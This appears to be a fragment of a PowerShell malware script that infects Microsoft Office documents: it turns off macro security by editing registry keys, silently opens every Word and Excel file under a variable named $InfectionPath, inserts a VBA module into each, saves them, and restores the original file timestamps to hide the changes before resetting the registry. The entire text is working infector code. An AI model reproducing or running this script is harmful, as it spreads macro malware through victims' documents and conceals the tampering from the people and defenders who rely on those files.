$Word = NEW-Object -comobject Word.Application
$Word.Visible = $False
$Word.AutomationSecurity = "msoAutomationSecurityForceDisable"
$WordVersion = $Word.Version
$Word.DisplayAlerts = 'wdAlertsNone'
$Word.Visible = $False
$Word.ScreenUpdating = $False
$Excel = New-Object -ComObject Excel.Application
$Excel.Visible = $False
$Excel.AutomationSecurity = "msoAutomationSecurityForceDisable"
$ExcelVersion = $Excel.Version
$Excel.DisplayAlerts = 'wdAlertsNone'
$Excel.DisplayAlerts = $False
$Excel.Visible = $False
$Excel.ScreenUpdating = $False
$Excel.UserControl = $False
$Excel.Interactive = $False

New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

Get-ChildItem -Path $InfectionPath\* -Include *.do*, *.xl* -Recurse | ForEach-Object {
    $WriteTimeBefore = $_.LastWriteTime
    $AccessTimeBefore = $_.LastAccessTime

    if ($_.Extension.ToString() -like ".xl*") {
        Add-Type -AssemblyName Microsoft.Office.Interop.Excel
        $Book = $Excel.Workbooks.Open($_.FullName)
        $Author = $Book.Author
        $Module = $Book.VBProject.VBComponents.Add(1)
        $Module.CodeModule.AddFromString($Code)
       
        switch ($_.Extension.toString())
        {
            ".xls"{
                "File is '.xls' " + $File.Name
                $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
            }
            ".xlsm"{
                "File is '.xlsm' " + $File.Name
                $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLWorkbookMacroEnabled)
            }
            ".xlt"{
                "File is '.xlt' " + $File.Name
                $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlTemplate8)
            }
            ".xltm"{
                "File is '.xltm' " + $File.Name
                $Book.SaveAs($File.FullName, [Microsoft.Office.Interop.Excel.XlFileFormat]::xlOpenXMLTemplateMacroEnabled)
            }
            default {
                "NOT Applicable. File extension: " + $File.Extension
            }
        }
        $Book.Author = $Author
        $Book.Close()
    }
    
    if ($_.Extension.ToString() -like ".do*") {
        Add-Type -AssemblyName Microsoft.Office.Interop.Word
        $Doc = $Word.Documents.Open($_.FullName)
        $Module = $Doc.VBProject.VBComponents.Add(1)
        $Module.CodeModule.AddFromString($Code)
        
        switch ($_.Extension.ToString()) {
            ".doc"{
                $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
                "File is '.doc' " + $File.Name
            }
            ".docm"{
                $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatXMLDocumentMacroEnabled)
                "File is '.docm' " + $File.Name
            }
            ".dot"{
                $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatTemplate97)
                "File is '.dot' " + $File.Name
            }
            ".dotm"{
                $Doc.SaveAs($File.FullName, [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatXMLTemplateMacroEnabled)
                "File is '.dotm' " + $File.Name
            }
            default {
                "NOT Applicable. File extension: " + $File.Extension
            }
        }
        $Doc.Close()

    }
    $_.LastWriteTime = $WriteTimeBefore
    $_.LastAccessTime = $AccessTimeBefore
}
$Word.Application.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
$Word = $null
if (PS winword) {
    kill -name winword
}
$Excel.Application.Quit()
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($Excel) | Out-Null
$Excel = $null
if (PS excel) {
    kill -name excel
}

New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force| Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force| Out-Null

}
